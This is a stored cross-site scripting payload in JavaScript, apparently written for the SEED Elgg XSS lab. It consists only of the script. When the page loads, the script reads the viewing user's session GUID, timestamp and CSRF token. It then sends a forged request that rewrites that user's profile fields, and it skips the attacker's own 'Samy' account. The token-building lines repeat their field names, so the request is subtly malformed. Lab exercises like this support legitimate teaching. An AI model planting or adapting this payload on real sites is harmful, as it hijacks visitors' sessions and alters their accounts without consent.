
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var guid = elgg.session.user.guid;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var owner = elgg.session.user.name ;
	//Construct the content of your url.
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
	var content="__elgg_token="+token+"&__elgg_ts="+ts+"&";
    content=content+"accesslevel[briefdescription]=1&accesslevel[contactemail]=1&";
    content=content+"accesslevel[description]=1&accesslevel[interests]=1&accesslevel[location]=1&";
    content=content+"accesslevel[mobile]=1&accesslevel[phone]=1&accesslevel[skills]=1&";
    content=content+"accesslevel[twitter]=1&accesslevel[website]=1&briefdescription=1605040&";
    content=content+"contactemail=won@gamil.com&description=Hi+i+am+shawon&guid="+guid+"&";
    content=content+"interests=playing+cricket&location=dhaka&mobile=0091&";
    content=content+"name="+owner+"&phone=34534&skills=football&twitter= &website= ";

	
	if(owner != 'Samy')
	 {
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);

	 }
 }
</script>